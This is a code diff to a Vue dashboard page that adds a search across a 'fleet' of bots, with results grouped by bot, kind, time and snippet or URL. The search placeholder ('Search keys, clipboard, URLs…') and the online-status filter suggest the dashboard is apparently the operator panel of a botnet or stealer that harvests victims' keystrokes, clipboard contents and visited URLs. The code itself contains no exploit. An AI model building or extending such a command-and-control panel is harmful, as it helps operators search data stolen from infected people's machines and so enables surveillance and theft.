@@ -2,17 +2,22 @@
 import { computed, onBeforeUnmount, onMounted, ref, watch } from 'vue'
 import { useRouter } from 'vue-router'
 import { useBotsStore } from '@/stores/bots'
-import { bots as botsApi } from '@/api/endpoints'
-import type { BotSummary } from '@/types/api'
+import { bots as botsApi, investigate } from '@/api/endpoints'
+import type { BotSummary, SearchHit } from '@/types/api'
 import BotRow from '@/components/bot/BotRow.vue'
 import Btn from '@/components/ui/Btn.vue'
 import Field from '@/components/ui/Field.vue'
+import { formatDate } from '@/composables/useTime'
 
 const store = useBotsStore()
 const router = useRouter()
 
 const filterName = ref('')
 const filterOnline = ref<string>('all') // 'all' | 'true' | 'false'
+const fleetQuery = ref('')
+const fleetHits = ref<SearchHit[]>([])
+const fleetSearching = ref(false)
+let fleetTimer: ReturnType<typeof setTimeout> | null = null
 
 const allChecked = computed(() => {
   if (store.list.length === 0) return false
@@ -33,6 +38,25 @@ let typeTimer: ReturnType<typeof setTimeout> | null = null
 watch(filterName, () => {
   if (typeTimer) clearTimeout(typeTimer)
   typeTimer = setTimeout(applyFilters, 200)
+})
+
+watch(fleetQuery, (q) => {
+  if (fleetTimer) clearTimeout(fleetTimer)
+  const trimmed = q.trim()
+  if (trimmed.length < 2) {
+    fleetHits.value = []
+    return
+  }
+  fleetTimer = setTimeout(async () => {
+    fleetSearching.value = true
+    try {
+      fleetHits.value = (await investigate.search(trimmed, undefined, 30)) ?? []
+    } catch {
+      fleetHits.value = []
+    } finally {
+      fleetSearching.value = false
+    }
+  }, 250)
 })
 
 function toggleAll(): void {
@@ -136,6 +160,12 @@ onBeforeUnmount(() => store.stopPolling())
         size="sm"
         :block="false"
       />
+      <Field
+        v-model="fleetQuery"
+        placeholder="Search keys, clipboard, URLs…"
+        size="sm"
+        :block="false"
+      />
       <select
         v-model="filterOnline"
         class="h-7 text-[11px] px-2 rounded bg-bg-overlay border border-border-subtle text-fg-base focus:outline-none focus:border-accent"
@@ -147,6 +177,25 @@ onBeforeUnmount(() => store.stopPolling())
       <span class="text-[11px] text-fg-faint mono ml-auto">
         showing {{ store.list.length }} of {{ store.pagination?.total ?? 0 }}
       </span>
+    </div>
+
+    <div v-if="fleetQuery.trim().length >= 2" class="surface mb-4 divide-y divide-border-subtle">
+      <div class="px-3 py-2 text-[11px] text-fg-faint">
+        {{ fleetSearching ? 'Searching…' : `${fleetHits.length} fleet hits` }}
+      </div>
+      <button
+        v-for="hit in fleetHits"
+        :key="hit.id"
+        class="w-full text-left px-3 py-2 hover:bg-bg-hover/60"
+        @click="open(hit.bot_id)"
+      >
+        <div class="flex items-baseline gap-2">
+          <span class="text-[10px] uppercase text-accent">{{ hit.kind }}</span>
+          <span class="text-[12px] font-medium">{{ hit.bot_name || hit.bot_id }}</span>
+          <span class="mono text-[10px] text-fg-faint ml-auto">{{ formatDate(hit.timestamp) }}</span>
+        </div>
+        <div class="text-[11px] text-fg-muted truncate">{{ hit.snippet || hit.url }}</div>
+      </button>
     </div>
 
     <!-- table -->
